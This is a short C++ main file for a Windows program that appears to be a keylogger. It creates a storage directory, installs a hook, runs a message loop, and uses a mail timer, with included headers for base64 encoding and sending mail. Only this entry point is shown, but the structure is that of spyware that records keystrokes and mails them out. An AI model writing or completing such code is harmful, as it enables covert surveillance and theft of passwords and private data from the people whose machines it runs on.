#include <iostream>
#include <windows.h>
#include "kc.h"
#include "helper.h"
#include "base64.h"
#include "in_out.h"
#include "timer.h"
#include "send_mail.h"
#include "main.h"

using namespace std;

int main()
{
    MSG m;
    inout::mkdir(inout::path(true));
    installHook();

    while(GetMessage(&m,NULL,0,0))
    {
        TranslateMessage(&m);
        DispatchMessage(&m);
    }

    MailTimer.stop();
    return 0;
}
